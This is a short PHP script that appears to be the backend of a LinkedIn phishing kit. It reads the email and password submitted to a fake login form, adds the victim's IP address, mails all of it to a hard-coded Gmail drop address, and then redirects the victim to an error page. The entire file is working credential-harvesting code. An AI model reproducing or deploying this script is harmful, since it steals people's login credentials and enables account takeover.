﻿<?php
//retrieve our data from POST
$ip = getenv("REMOTE_ADDR");
$message .= "----------King khalifa Pluto  ADMIN------------\n";
$message .= "User ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "$ip \n";
$message .= "——————LINKEDIN LOGS——————\n";


$recipient = "rezultboss18@gmail.com";
$subject = "Linkedin RESULT";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);

header("Location: erro2.php");
?> 